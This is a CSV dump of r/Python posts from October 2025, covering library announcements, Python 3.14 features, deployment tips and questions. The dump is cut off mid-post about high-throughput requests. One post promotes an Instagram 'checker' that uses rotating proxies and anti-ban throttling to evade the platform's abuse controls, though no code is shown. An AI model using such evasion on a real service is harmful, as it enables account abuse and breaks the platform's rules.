id,title,author,score,num_comments,created_utc,url,selftext
1o1j2b3,"My project to learn descriptors, rich comparison functions, asyncio, and type hinting",gdchinacat,5,0,2025-10-08 18:39:50,https://www.reddit.com/r/Python/comments/1o1j2b3/my_project_to_learn_descriptors_rich_comparison/,"[https://github.com/gdchinacat/reactions](https://github.com/gdchinacat/reactions)

I began this project a couple weeks ago based on an idea from another post (link below). I realized it would be a great way to learn some aspects of python I was not yet familiar with. 

The idea is that you can implement classes with fields and then specify conditions for when methods should be called in reaction to those field changing. For example:


    @dataclass
    class Counter:
        count: Field[int] = Field(-1)

        @ count >= 0
        async def loop(self, field, old, new):
                self.count += 1



When count is changed to non negative number it will start counting. Type annotations and some execution management code has been removed. For working examples see src/test/examples directory.

The code has liberal todos in it to expand the functionality, but the core of it is stable, so I thought it was time to release it.

Please let me know your thoughts, or feel free to ask questions about how it works or why I did things a certain way. Thanks!

The post that got me thinking about this: [https://www.reddit.com/r/Python/comments/1nmta0f/i\_built\_a\_full\_programming\_language\_interpreter/](https://www.reddit.com/r/Python/comments/1nmta0f/i_built_a_full_programming_language_interpreter/)"
1o1ixgu,Good SQLBuilder for Python?,yughiro_destroyer,2,0,2025-10-08 18:34:58,https://www.reddit.com/r/Python/comments/1o1ixgu/good_sqlbuilder_for_python/,"Hello!  
I need to develop a small-medium forum with basic functionalities but I also need to make sure it supports DB swaps easily. I don't like to use ORMs because of their poor performance and I know SQL good enough not to care about it's conveinences. 

Many suggest SQLAlchemy Core but for 2 days I've been trying to read the official documentation. At first I thought ""woah, so much writing, must be very solid and straightforward"" only to realize I don't understand much of it. Or perhaps I don't have the patience.

Another alternative is PyPika which has a very small and clear documentation, easy to memorize the API after using it a few times and helps with translating an SQL query to multiple SQL dialects. 

Just curious, are there any other alternatives?  
Thanks!"
1o1ipfo,Pydantic v2.12 release (Python 3.14),__secondary__,14,3,2025-10-08 18:26:53,https://www.reddit.com/r/Python/comments/1o1ipfo/pydantic_v212_release_python_314/,"[https://pydantic.dev/articles/pydantic-v2-12-release](https://pydantic.dev/articles/pydantic-v2-12-release)

* Support for Python 3.14
* New experimental `MISSING` sentinel
* Support for PEP 728 (`TypedDict` with `extra_items`)
* Preserve empty URL paths (`url_preserve_empty_path`)
* Control timestamp validation unit (`val_temporal_unit`)
* New `exclude_if` field option
* New `ensure_ascii` JSON serialization option
* Per-validation `extra` configuration
* Strict version check for `pydantic-core`
* JSON Schema improvements (regex for Decimal, custom titles, etc.)
* Only latest mypy version officially supported
* Slight validation performance improvement

"
1o1gdhe,Software to tell me when an item is available at best buy for in store purchase?,supershimadabro,0,4,2025-10-08 17:06:33,https://www.reddit.com/r/Python/comments/1o1gdhe/software_to_tell_me_when_an_item_is_available_at/,"So someone i know has some sort of a server setup that can scrape bestbuy with apache snd python and know if an item is available for in-store purchase via SKU ordering. 

I talked to chatgpt and it sounds simple enough, however I was wondering if any discords or ready to download apps already run something like this to save me time from having to figure it out. "
1o18p3a,Feature Store Summit - 2025 - Free and Online.,logicalclocks,9,2,2025-10-08 12:11:06,https://www.reddit.com/r/Python/comments/1o18p3a/feature_store_summit_2025_free_and_online/,"**Hello Pytonistas !**  
  
We are organising the Feature Store Summit. An annual online event where we invite some of the most technical speakers from some of the world‚Äôs most advanced engineering teams to talk about their infrastructure for AI, ML and oftentime how this fits in the pythonic ecosystem.   
  
**Some of this year‚Äôs speakers are coming from:**  
Uber, Pinterest, Zalando, Lyft, Coinbase, Hopsworks and More!

**What to Expect:**  
üî• Real-Time Feature Engineering at scale  
üî•¬†Vector Databases & Generative AI in production  
üî•¬†The balance of Batch & Real-Time workflows  
üî•¬†Emerging trends driving the evolution of Feature Stores in 2025

**When:**  
üóìÔ∏è¬†October 14th  
‚è∞¬†Starting 8:30AM PT  
‚è∞ Starting 5:30PM CET  
  
Link;¬†[https://www.featurestoresummit.com/register](https://www.featurestoresummit.com/register?utm_source=reddit)

PS; it is free, online, and if you register you will be receiving the recorded talks afterward! 

  
"
1o17ogm,TOML marries Argparse,Prestigious-Nerve851,10,9,2025-10-08 11:20:18,https://www.reddit.com/r/Python/comments/1o17ogm/toml_marries_argparse/,"I wanted to share a small Python library I havee been working on that might help with managing ML experiment configurations.

Jump here directly to the repository: [https://github.com/florianmahner/tomlparse](https://github.com/florianmahner/tomlparse)

**What is it?**

tomlparse is a lightweight wrapper around Python's argparse that lets you use TOML files for configuration management while keeping all the benefits of argparse. It is designed to make hyperparameter management less painful for larger projects.

**Why TOML?**

If you've been using YAML or JSON for configs, TOML offers some nice advantages:

* Native support for dates, floats, integers, booleans, and arrays
* Clear, readable syntax without significant whitespace issues
* Official Python standard library support (tomllib in Python 3.11+)
* Comments that actually stay comments

**Key Features**

The library adds minimal overhead to your existing argparse workflow:

    import tomlparse
    
    parser = tomlparse.ArgumentParser()
    parser.add_argument(""--foo"", type=int, default=0)
    parser.add_argument(""--bar"", type=str, default="""")
    args = parser.parse_args()

Then run with:

    python experiment.py --config ""example.toml""

**What I find useful:**

1. **Table support** \- Organize configs into sections and switch between them easily
2. **Clear override hierarchy** \- CLI args > TOML table values > TOML root values > defaults
3. **Easy experiment tracking** \- Keep different TOML files for different experiment runs

**Example use case with tables:**

    # This is a TOML File
    # Parameters without a preceding [] are not part of a table (called root-table)
    foo = 10
    bar = ""hello""
    
    # These arguments are part of the table [general]
    [general]
    foo = 20
    
    # These arguments are part of the table [root]
    [root]
    bar = ""hey""

You can then specify which table to use:

    python experiment.py --config ""example.toml"" --table ""general""
    # Returns: {""foo"": 20, ""bar"": ""hello""}
    
    python experiment.py --config ""example.toml"" --table ""general"" --root-table ""root""
    # Returns: {""foo"": 20, ""bar"": ""hey""}

And you can always override from the command line:

    python experiment.py --config ""example.toml"" --table ""general"" --foo 100

**Install:**

    pip install tomlparse

**GitHub:** [https://github.com/florianmahner/tomlparse](https://github.com/florianmahner/tomlparse)

Would love to hear thoughts or feedback if anyone tries it out! It has been useful for my own work, but I am sure there are edge cases I haven't considered.

*Disclaimer: This is a personal project, not affiliated with any organization.*"
1o17iwq,Interesting discussion to shift Apache's Arrow release cycle forward to align with Python's release,Balance-,20,2,2025-10-08 11:11:59,https://www.reddit.com/r/Python/comments/1o17iwq/interesting_discussion_to_shift_apaches_arrow/,"There's an interesting discussion in the PyArrow community about shifting their release cycle to better align with Python's annual release schedule. Currently, PyArrow often becomes the last major dependency to support new Python versions, with support arriving about a month after Python's stable release, which creates a bottleneck for the broader data engineering ecosystem.

The proposal suggests moving Arrow's feature freeze from early October to early August, shortly after Python's ABI-stable release candidate drops in late July, which would flip the timeline so PyArrow wheels are available around a month before Python's stable release rather than after.

[https://github.com/apache/arrow/issues/47700](https://github.com/apache/arrow/issues/47700)"
1o150hi,Use uv with Python 3.14 and IIS sites,gschizas,34,21,2025-10-08 08:36:50,https://www.reddit.com/r/Python/comments/1o150hi/use_uv_with_python_314_and_iis_sites/,"After the upgrade to Python 3.14, there's no longer the concept of a ""system-wide"" Python. Therefore, when you create a virtual environment, the hardlinks (if they are really hardlinks) point to `%LOCALAPPDATA%\Python\pythoncore-3.14-64\python.exe`. The problem is that if you have a virtual environment for an IIS website, e.g. spanandeggs.example.com, this will by default run with the virtual user IISAPPPOOL\spanandeggs.example.com. And that user most certainly doesn't have access to your personal `%LOCALAPPDATA%` directory. So, if you try to run the site, you'll get this error:

`did not find executable at '¬´%LOCALAPPDATA%¬ª\Python\pythoncore-3.14-64\python.exe': Access is denied.`

To make this work I've had to:

1. Download python to a separate directory (`uv python install 3.14 --install-dir C:\python\`)
2. Sync the virtual environment with the new Python version: `uv sync --upgrade --python C:\Python\cpython-3.14.0-windows-x86_64-none\`)

For completeness, where's an example web.config to make a site run natively under IIS (this assumes there's an app.py). I'm not 100% sure that all environment variables are required:

    <?xml version=""1.0"" encoding=""UTF-8""?>
    <configuration>
        <system.webServer>
            <modules runAllManagedModulesForAllRequests=""true"" />
            <handlers>
                <clear/>
                <add name=""httpPlatformHandler"" path=""*"" verb=""*"" modules=""httpPlatformHandler"" resourceType=""Unspecified"" requireAccess=""Script"" />
            </handlers>
            <httpPlatform processPath="".\.venv\Scripts\python.exe"" arguments=""-m flask run --port %HTTP_PLATFORM_PORT%"">
                <environmentVariables>
                    <environmentVariable name=""SERVER_PORT"" value=""%HTTP_PLATFORM_PORT%"" />
                    <environmentVariable name=""PYTHONPATH"" value=""."" />
                    <environmentVariable name=""PYTHONHOME"" value="""" />
                    <environmentVariable name=""VIRTUAL_ENV"" value="".venv"" />
                    <environmentVariable name=""PATH"" value="".venv\Scripts"" />
                </environmentVariables>
            </httpPlatform>
        </system.webServer>
    </configuration>"
1o0zsa2,Pyloid: Electron for Python Developer ‚Ä¢ Modern Web-based desktop app framework,Ok-Method-9403,9,0,2025-10-08 03:24:18,https://www.reddit.com/r/Python/comments/1o0zsa2/pyloid_electron_for_python_developer_modern/,"**I updated so many features!**  
**I'm excited to introduce this project! üéâ**

[Pyloid](https://pyloid.com/): Electron for Python Developer ‚Ä¢ Modern Web-based desktop app framework

this project based on `Pyside6` and `QtWebengine`

this project is an alternative to `Electron` for python dev

**What My Project Does:** With this project, you can build any desktop app.

**Target Audience:** All desktop app developer.

# Key Features

* **All Frontend Frameworks**¬†are supported
* **All Backend Frameworks**¬†are supported
* **All features necessary**¬†for a desktop application are implemented
* **Cross-Platform Support**¬†(Windows, macOS, Linux)
* **Many Built-in Tools**¬†(Builder, Server, Tray, Store, Timer, Monitor, Optimizer, etc.)

# simple example 1

`pip install pyloid`

    from pyloid import Pyloid
    
    app = Pyloid(app_name=""Pyloid-App"")
    
    win = app.create_window(title=""hello"")
    win.load_html(""<h1>Hello, Pyloid!</h1>"")
    
    win.show_and_focus()

# simple example 2 (with React)

    from pyloid.serve import pyloid_serve
    from pyloid import Pyloid
    
    app = Pyloid(app_name=""Pyloid-App"")
    
    app.set_icon(get_production_path(""src-pyloid/icons/icon.png""))
    
    
    if is_production():
    ¬† ¬† url = pyloid_serve(directory=get_production_path(""dist-front""))
    ¬† ¬† win = app.create_window(title=""hello"")
    ¬† ¬† win.load_url(url)
    else:
    ¬† ¬† win = app.create_window(
    ¬†       title=""hello-dev"",
    ¬† ¬† ¬† ¬† dev_tools=True¬† ¬† 
        )
    ¬† ¬† win.load_url(""http://localhost:5173"")
    
    win.show_and_focus()
    
    app.run()

# Get started

[You need 3 tools (python, node.js, uv)](https://pyloid.com/docs/prequisites)

    npm create pyloid-app@latest

if you want more info,  [https://pyloid.com/](https://pyloid.com/)

# Links

* site & docs : [https://pyloid.com/](https://pyloid.com/)
* github: [https://github.com/pyloid/pyloid](https://github.com/pyloid/pyloid)"
1o0wajw,T-Strings: Worth using for SQL in Python 3.14?,simplysalamander,55,18,2025-10-08 00:35:57,https://www.reddit.com/r/Python/comments/1o0wajw/tstrings_worth_using_for_sql_in_python_314/,"This video breaks down one of the proposed use-cases for the new t-string feature from PEP 750: SQL sanitization. Handling SQL statements is not new for Python, so t-strings are compared to the standard method of manually inserting placeholder characters for safe SQL queries:

[https://youtu.be/R5ov9SbLaYc](https://youtu.be/R5ov9SbLaYc)

The tl;dw: in some contexts, switching to t-string notation makes queries significantly easier to read, debug, and manage. But for simple SQL statements with only one or two parameters, hand-placing parameters in the query will still be the simplest standard.

What do you think about using t-strings for handling complex SQL statements in Python programs?"
1o0u0ts,"Is there conventional terminology for ""non-callable attribute""",jpgoldberg,6,18,2025-10-07 22:55:23,https://www.reddit.com/r/Python/comments/1o0u0ts/is_there_conventional_terminology_for_noncallable/,"I am writing what I suppose could be considered a tutorial, and I would like to use a term for non-callable attributes that will be either be familiar to the those who have some familiarity with classes or at least understandable to those learners without additional explanation. The terminology does not need to be precise.

So far I am just using the term ""attribute"" ambiguously. Sometimes I am using to to refer attributes of an object that aren't methods and sometimes I am using it in the more technical sense that includes methods. I suspect that this is just what I will have to keep doing and rely on the context to to disambiguate.

**Update**: ‚Äúmember variable‚Äù is the term I was looking for. Thank you, u/PurepointDog/

"
1o0tdmf,Crawlee for Python team AMA,ellatronique,0,8,2025-10-07 22:28:10,https://www.reddit.com/r/Python/comments/1o0tdmf/crawlee_for_python_team_ama/,"Hi everyone! [We posted last week](https://www.reddit.com/r/Python/comments/1nu8tt6/crawlee_for_python_v10_is_live/) to say that we had moved [Crawlee for Python](https://crawlee.dev/python) out of beta and promised we would be back to answer your questions about webscraping, Python tooling, community-driven development, testing, versioning, and anything else.

We're pretty enthusiastic about the work we put into this library and the tools we've built it with, so would love to dive into these topics with you today. Ask us anything!

>Thanks for the questions folks! If you didn't make it in time to ask your questions, don't worry and ask away, we'll respond anyway."
1o0m9yt,Tired of Messy WebSockets? I Built Chanx to End the If/Else Hell in Real-Time Python App,huygl99,13,0,2025-10-07 18:04:07,https://www.reddit.com/r/Python/comments/1o0m9yt/tired_of_messy_websockets_i_built_chanx_to_end/,"After 3 years of building AI agents and real-time applications across Django and FastAPI, I kept hitting the same wall: WebSocket development was a mess of if/else chains, manual validation, and zero documentation. When working with FastAPI, I'd wish for a powerful WebSocket framework that could match the elegance of its REST API development. To solve this once and for all, I built Chanx ‚Äì the WebSocket toolkit I wish existed from day one.

## What My Project Does

## The Pain Point Every Python Developer Knows

Building WebSocket apps in Python is a nightmare we all share:

```python
# The usual FastAPI WebSocket mess
@app.websocket(""/ws"")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    while True:
        data = await websocket.receive_json()
        action = data.get(""action"")
        if action == ""echo"":
            await websocket.send_json({""action"": ""echo_response"", ""payload"": data.get(""payload"")})
        elif action == ""ping"":
            await websocket.send_json({""action"": ""pong"", ""payload"": None})
        elif action == ""join_room"":
            # Manual room handling...
        # ... 20 more elif statements
```

Plus manual validation, zero documentation, and trying to send events from Django views or FastAPI endpoints to WebSocket clients? Pure pain.

**Chanx eliminates all of this** with decorator automation that works consistently across frameworks.

## How Chanx Transforms Your Code

```python
from typing import Literal
from pydantic import BaseModel
from chanx.core.decorators import ws_handler, event_handler, channel
from chanx.core.websocket import AsyncJsonWebsocketConsumer
from chanx.messages.base import BaseMessage

# Define your message types (action-based routing)
class EchoPayload(BaseModel):
    message: str

class NotificationPayload(BaseModel):
    alert: str
    level: str = ""info""

# Client Messages
class EchoMessage(BaseMessage):
    action: Literal[""echo""] = ""echo""
    payload: EchoPayload

# Server Messages
class EchoResponseMessage(BaseMessage):
    action: Literal[""echo_response""] = ""echo_response""
    payload: EchoPayload

class NotificationMessage(BaseMessage):
    action: Literal[""notification""] = ""notification""
    payload: NotificationPayload

# Events (for server-side broadcasting)
class SystemNotifyEvent(BaseMessage):
    action: Literal[""system_notify""] = ""system_notify""
    payload: NotificationPayload

@channel(name=""chat"", description=""Real-time chat API"")
class ChatConsumer(AsyncJsonWebsocketConsumer):
    @ws_handler(summary=""Handle echo messages"", output_type=EchoResponseMessage)
    async def handle_echo(self, message: EchoMessage) -> None:
        await self.send_message(EchoResponseMessage(payload=message.payload))

    @event_handler(output_type=NotificationMessage)
    async def handle_system_notify(self, event: SystemNotifyEvent) -> NotificationMessage:
        return NotificationMessage(payload=event.payload)
```

**Key features:**
- üéØ **Decorator-based routing** - No more if/else chains
- üìö **Auto AsyncAPI docs** - Generate comprehensive WebSocket API documentation
- üîí **Type safety** - Full mypy/pyright support with Pydantic validation
- üåê **Multi-framework** - Django Channels, FastAPI, any ASGI framework
- üì° **Event broadcasting** - Send events from HTTP views, background tasks, anywhere
- üß™ **Enhanced testing** - Framework-specific testing utilities

## Target Audience

**Chanx is production-ready** and designed for:
- Python developers building real-time features (chat, notifications, live updates)
- Django teams wanting to eliminate WebSocket boilerplate
- FastAPI projects needing robust WebSocket capabilities
- Full-stack applications requiring seamless HTTP ‚Üî WebSocket event broadcasting
- Type-safety advocates who want comprehensive IDE support for WebSocket development
- API-first teams needing automatic AsyncAPI documentation

Built from 3+ years of experience developing AI chat applications, real-time voice recording systems, and live notification platforms - solving every pain point I encountered along the way.

## Comparison

**vs Raw Django Channels/FastAPI WebSockets:**
- ‚ùå Manual if/else routing ‚Üí ‚úÖ Automatic decorator-based routing
- ‚ùå Manual validation ‚Üí ‚úÖ Automatic Pydantic validation
- ‚ùå No documentation ‚Üí ‚úÖ Auto-generated AsyncAPI 3.0 specs
- ‚ùå Complex event sending ‚Üí ‚úÖ Simple broadcasting from anywhere

**vs Broadcaster:**
- Broadcaster is just pub/sub messaging
- Chanx provides complete WebSocket consumer framework with routing, validation, docs

**vs FastStream:**
- FastStream focuses on message brokers (Kafka, RabbitMQ, etc.) for async messaging
- Chanx focuses on real-time WebSocket applications with decorator-based routing, auto-validation, and seamless HTTP integration
- Different use cases: FastStream for distributed systems, Chanx for interactive real-time features

## Installation

```bash
# Django Channels
pip install ""chanx[channels]""  # Includes Django, DRF, Channels Redis

# FastAPI
pip install ""chanx[fast_channels]""  # Includes FastAPI, fast-channels

# Any ASGI framework
pip install chanx  # Core only
```

## Real-World Usage

Send events from anywhere in your application:

```python
# From FastAPI endpoint
@app.post(""/api/posts"")
async def create_post(post_data: PostCreate):
    post = await create_post_logic(post_data)

    # Instantly notify WebSocket clients
    await ChatConsumer.broadcast_event(
        NewPostEvent(payload={""title"": post.title}),
        groups=[""feed_updates""]
    )
    return {""status"": ""created""}

# From Django views, Celery tasks, management scripts
ChatConsumer.broadcast_event_sync(
    NotificationEvent(payload={""alert"": ""System maintenance""}),
    groups=[""admin_users""]
)
```

**Links:**
- üîó **GitHub:** https://github.com/huynguyengl99/chanx
- üì¶ **PyPI:** https://pypi.org/project/chanx/
- üìñ **Documentation:** https://chanx.readthedocs.io/
- üöÄ **Django Examples:** https://chanx.readthedocs.io/en/latest/examples/django.html
- ‚ö° **FastAPI Examples:** https://chanx.readthedocs.io/en/latest/examples/fastapi.html

Give it a try in your next project and let me know what you think! If it saves you development time, a ‚≠ê on GitHub would mean the world to me. Would love to hear your feedback and experiences!
"
1o0jw4w,Instrument AI PDF Splitter ‚Äì Split full orchestral PDFs into per-instrument parts,Discovery_Fox,0,0,2025-10-07 16:39:57,https://www.reddit.com/r/Python/comments/1o0jw4w/instrument_ai_pdf_splitter_split_full_orchestral/,"Hey everyone,

I‚Äôve been building a small open-source Python project called Instrument AI PDF Splitter. It takes massive orchestra PDFs (with all instruments in one file) and automatically splits them into clean PDFs for each part.


---

What My Project Does

Detects instrument names, voice numbers (like ‚ÄúTrumpet 2‚Äù or ‚ÄúViolin I‚Äù), and their start/end pages automatically using OpenAI.

Works with both scanned and digital sheet music PDFs.

Saves per-instrument PDFs in a neat folder and outputs structured JSON metadata.

Avoids re-uploading the same file by hashing it.

Allows custom instrument lists if needed.

Can be integrated into orchestral score management software ‚Äî I‚Äôm currently developing a project for managing full digital orchestral scores, which this tool will complement.



---

Target Audience

Orchestras, ensembles, and developers building tools for digital music management.

Anyone who needs to extract individual parts from combined sheet music PDFs.

Not a full score management solution on its own, but a practical building block for such workflows.



---

Comparison
Unlike existing PDF splitters or music OCR tools, this project:

Automatically detects instruments and voice numbers instead of requiring manual input.

Handles both scanned and digital PDFs.

Produces ready-to-use per-instrument PDFs plus structured JSON metadata.

Is lightweight, open-source, and easy to integrate into larger orchestral score management systems.



---

Install

`pip install instrumentaipdfsplitter`

Requires Python 3.10+ and an OpenAI API key.


---

Quick example

```python
from instrumentaipdfsplitter import InstrumentAiPdfSplitter

splitter = InstrumentAiPdfSplitter(api_key=""YOUR_OPENAI_API_KEY"")

# Analyze the score
data = splitter.analyse(""path/to/score.pdf"")

# Split it into instrument parts
results = splitter.split_pdf(""path/to/score.pdf"")
```

---

üîó [PyPI](https://pypi.org/project/instrumentaipdfsplitter/)
üîó [GitHub](https://github.com/DiscoveryFox/InstrumentAiPdfSplitter)

I‚Äôd love to hear your feedback! Hopefully this makes splitting full scores easier and can help feed into orchestral score management systems ‚Äî stay tuned, I‚Äôll be posting about that project in a few days."
1o0jr55,My favorite new features in Python 3.14,treyhunner,312,44,2025-10-07 16:34:51,https://www.reddit.com/r/Python/comments/1o0jr55/my_favorite_new_features_in_python_314/,"I have been using Python 3.14 as my primary version while teaching and writing one-off scripts for over 6 months. My favorite features are the ones that immediately impact newer Python users.

My favorite new features in Python 3.14:

* All the color (REPL & PDB syntax highlighting, argparse help, unittest, etc.)
* pathlib's copy & move methods: no more need for shutil
* date.strptime: no more need for datetime.strptime().date()
* uuid7: random but also orderable/sortable
* argparse choice typo suggestions
* t-strings: see [awesome-t-strings](https://github.com/t-strings/awesome-t-strings) for libraries using them
* concurrent subinterpreters: the best of both threading & multiprocessing
* import tab completion

I recorded [a 6 minute demo](https://youtu.be/bcMXCxefUPk) of these features and [wrote an article on them](https://pym.dev/python314/)."
1o0j06z,Built a BLE Proximity Alert System in Python,bleuio,0,0,2025-10-07 16:06:59,https://www.reddit.com/r/Python/comments/1o0j06z/built_a_ble_proximity_alert_system_in_python/,"# I‚Äôve been experimenting with Bluetooth Low Energy and wrote a simple Python script that detects nearby BLE devices based on signal strength (RSSI).

The script triggers a sound when a specific device comes within range ‚Äî a fun way to explore how proximity detection works in Python using the **BleuIO** USB dongle (it handles the BLE scanning).

It‚Äôs great for learning or building small application like access control, IoT automation, or security demos.  
Code and full walkthrough here:

[https://www.bleuio.com/blog/ble-device-proximity-alert-system-using-bleuio/](https://www.bleuio.com/blog/ble-device-proximity-alert-system-using-bleuio/)"
1o0iu40,I made a multiplayer Tic Tac Toe game in Python using sockets,itzpremsingh,8,0,2025-10-07 16:00:48,https://www.reddit.com/r/Python/comments/1o0iu40/i_made_a_multiplayer_tic_tac_toe_game_in_python/,"Hey everyone, I just finished a multiplayer Tic Tac Toe game in Python. It runs using only Python's built-in modules, and players can connect and play live from their own terminals using sockets.

What my project does:

* Lets multiple players play Tic Tac Toe over a network.
* Uses Python's socket module to send and receive moves in real time.
* Automatically handles turns, move validation, and win/draw checks.
* Completely terminal-based, so no extra software is needed.

Target Audience:

* Python beginners wanting to learn about network programming.
* People curious about how real-time multiplayer games work.
* Developers looking for a simple multiplayer game example without extra dependencies.

Comparison:
Most Tic Tac Toe projects are limited to two players on the same machine. This one allows multiple players to connect over a network using raw sockets. It's lightweight, easy to run, and simple to understand.

Check it out on GitHub: [https://github.com/itzpremsingh/tictactoe](https://github.com/itzpremsingh/tictactoe)

I‚Äôd love to hear your feedback and ideas!"
1o0is69,dirstree: an another library for iterating through the contents of a directory,pomponchik,0,2,2025-10-07 15:58:48,https://www.reddit.com/r/Python/comments/1o0is69/dirstree_an_another_library_for_iterating_through/,"Hello¬†[r/Python](https://www.reddit.com/r/Python/)! üëã

I have released a new micro library that allows recursively iterating over files in a given directory: [dirstree](https://github.com/pomponchik/dirstree). Now I will briefly describe why it is needed.

# What My Project Does

There are a lot of libraries that allow recursively traversing files in a directory. It's also easy to do without third-party libraries, all the necessary batteries are included. Why do we need `dirstree`?

This library provides several advantages:

1. The most compact and pythonic interface for iterating through files.
2. The ability to filter files by extensions, text templates in `.gitignore` format, as well as using custom functions.
3. Support for [cancellation tokens](https://github.com/pomponchik/cantok). This is useful if your program can run for a long time with a large number of files.
4. The ability to easily combine several different directory crawl conditions into a single object.
5. 100% test coverage, of course!

The simplest example of syntax:

```python
from dirstree import Crawler

crawler = Crawler('.')

for file in crawler:
    print(file)
```

As you can see, it's beautiful and there's nothing superfluous.

# Target Audience

Anyone who has to work with the file system throw Python.

# Comparison

There are many similar libraries, but the same combination of beautiful python syntax, support for cancellation tokens, and a large number of types of filtering no longer exists."
1o0hk15,I built an Instagram checker with smart anti-ban logic & multi-threading. Open for feedback!,hd0rr,0,0,2025-10-07 15:13:50,https://www.reddit.com/r/Python/comments/1o0hk15/i_built_an_instagram_checker_with_smart_antiban/,"**mYCheckerForInstagram**  
An advanced Instagram checker with smart anti-ban logic.

* Fast (multi-threaded)
* Auto-switching proxies
* Smart throttling
* Built for educational purposes.

Repo:  
[github.com/0xkhalz/mYCheckerForInstagram](http://github.com/hd0r/mYCheckerForInstagram)  
\#pentesting #bugbounty #python #automation #github"
1o0h25y,A Telegram Bot for Finding Perfume & Clones,Superb-East9538,0,2,2025-10-07 14:55:55,https://www.reddit.com/r/Python/comments/1o0h25y/a_telegram_bot_for_finding_perfume_clones/,"**What My Project Does**

Perfume Twins is a Telegram bot that helps you find expensive designer perfumes and instantly pairs them with affordable dupes.

The bot contains a database of 2000+ perfumes (originals + clones, gathered from fragrance communities).  
Built entirely in Python.  
Initial data is included in CSV tables.  
English & Russian interface versions.

I would appreciate any feedback: on the code, the data, or the user experience.  
Thank you.

**Target Audience**

Anyone looking for reliable, affordable alternatives to luxury scents. Suitable for production use via Telegram, not just a toy project.

**Comparison**

Unlike browsing forums or subreddits manually, Perfume Twins offers the biggest, cleanest, and instantly searchable database of originals and clones. The search is typo-tolerant and structured for fast results, saving users hours of searching. Free, open, and easy to use.

Links

Try the Bot: @ parfumanalogbot

Source Code: [github.com/rustam-k0/perfume-bot-public](http://github.com/rustam-k0/perfume-bot-public)

*Note: I previously posted a link to this project, but I changed the structure of the post and the bot didn‚Äôt like it.*"
1o0gfp1,Python 3.14 Released,chinawcswing,926,89,2025-10-07 14:32:22,https://www.reddit.com/r/Python/comments/1o0gfp1/python_314_released/,"https://docs.python.org/3.14/whatsnew/3.14.html

Interpreter improvements:

* PEP 649 and PEP 749: Deferred evaluation of annotations
* PEP 734: Multiple interpreters in the standard library
* PEP 750: Template strings
* PEP 758: Allow except and except* expressions without brackets
* PEP 765: Control flow in finally blocks
* PEP 768: Safe external debugger interface for CPython
* A new type of interpreter
* Free-threaded mode improvements
* Improved error messages
* Incremental garbage collection

Significant improvements in the standard library:

* PEP 784: Zstandard support in the standard library
* Asyncio introspection capabilities
* Concurrent safe warnings control
* Syntax highlighting in the default interactive shell, and color output in several standard library CLIs

C API improvements:

* PEP 741: Python configuration C API

Platform support:

* PEP 776: Emscripten is now an officially supported platform, at tier 3.

Release changes:

* PEP 779: Free-threaded Python is officially supported
* PEP 761: PGP signatures have been discontinued for official releases
* Windows and macOS binary releases now support the experimental just-in-time compiler
* Binary releases for Android are now provided"
1o0gdex,Otary now includes 17 image binarization methods,Narrow-Treacle-6460,11,3,2025-10-07 14:29:56,https://www.reddit.com/r/Python/comments/1o0gdex/otary_now_includes_17_image_binarization_methods/,"**What does my project does**: Otary is an open-source Python library dedicated to image manipulation and 2D geometry processing. It gets even smarter with the addition of 17 binarization methods now available! [Jump to the documentation straight away](https://alexandrepoupeau.com/otary/api/image/transformers/thresholding/).

**Target Audience**: Python developers or researchers focused on image processing and computer vision tasks.

**Comparison**: you could actually use Numpy, OpenCV directly. They are used behind the scene by Otary.

Otary now includes 17 binarization methods, designed to make experimentation both simple for beginners and powerful for advanced users.

üîπ **5 basic methods**: easily accessible for quick and efficient use: simple, otsu, adaptive, bradley, and sauvola.

These methods are the most classic and effective, perfect for new users and for 90% of practical cases.

üîπ **12 advanced methods**: for users who want to explore, compare, and understand more sophisticated approaches.

They are intended for image processing specialists and researchers who want to experiment with new ideas.

üìñ The documentation presents a summary table of the 17 methods, classified by year of publication and accompanied by links to the original scientific articles.

‚ú® My revelation: FAIR binarization.

FAIR stands for ‚ÄúFast Algorithm for document Image Restoration‚Äù and it has completely changed the way I approach binarization. Rather than binarizing the entire image, it:

1. First detects edge pixels with a custom Canny edge detector
2. Applies a clustering algorithm to small windows centered around the edge pixels.
3. Performs post-processing to complete the total binarization of the image

This is the approach I found most innovative among all those I have explored and implemented. It uses the Expectation-Maximization algorithm to identify text pixels versus background pixels by assuming a Gaussian mixture distribution: it's simply brilliant!

üí¨ I sincerely hope that this update will make the work of developers, engineers, and researchers who manipulate images easier and inspire new explorations.

üôè I would also like to encourage everyone to contribute, add new binarization methods, improve existing ones, or even invent new approaches.

If you spot an error or have ideas for improving Otary, your contributions are welcome, that's the spirit of open source.

**Github link**: [https://github.com/poupeaua/otary](https://github.com/poupeaua/otary)"
1o0echb,Bringing NumPy's type-completeness score to nearly 90%,BeamMeUpBiscotti,135,18,2025-10-07 13:10:07,https://www.reddit.com/r/Python/comments/1o0echb/bringing_numpys_typecompleteness_score_to_nearly/,"> Because NumPy is one of the most downloaded packages in the Python ecosystem, any incremental improvement can have a large impact on the data science ecosystem. In particular, improvements related to static typing can improve developer experience and help downstream libraries write safer code. We'll tell the story about how we (Quansight Labs, with support from Meta's Pyrefly team) helped bring its type-completeness score to nearly 90% from an initial 33%.

Full blog post: https://pyrefly.org/blog/numpy-type-completeness/"
1o0cyz4,Is hello world that complicated?,EffectiveMaterial781,0,37,2025-10-07 12:10:17,https://www.reddit.com/r/Python/comments/1o0cyz4/is_hello_world_that_complicated/,"So I just came across this tweet, and here he talks about what goes on when we write hello world. Is it really that complicated?

Like so many things going on just 1 simple syntax 

https://x.com/aBlackPigeon/status/1975294226163507455?t=jktU6ixa_tV0gJONrx6J9g&s=19"
1o085tj,"I pushed Python to 20,000 requests sent/second. Here's the code and kernel tuning I used.",Lafftar,143,56,2025-10-07 07:27:57,https://www.reddit.com/r/Python/comments/1o085tj/i_pushed_python_to_20000_requests_sentsecond/,"  
**What My Project Does:** Push Python to 20k req/sec.

**Target Audience**: People who need to make a ton of requests.

**Comparison**: Previous articles I found ranged from 50-500 requests/sec with python, figured i'd give an update to where things are at now.

I wanted to share a personal project exploring the limits of Python for high-throughput network I/O. My clients would always say ""lol no python, only go"", so I wanted to see what was actually possible.

After a lot of tuning, I managed to get a stable **\~20,000 requests/second** from a single client machine.

The code itself is based on `asyncio` and a library called `rnet`, which is a Python wrapper for the high-performance Rust library `wreq`. This lets me get the developer-friendly syntax of Python with the raw speed of Rust for the actual networking.

The most interesting part wasn't the code, but the OS tuning. The default kernel settings on Linux are nowhere near ready for this kind of load. The application would fail instantly without these changes.

Here are the most critical settings I had to change on both the client and server:

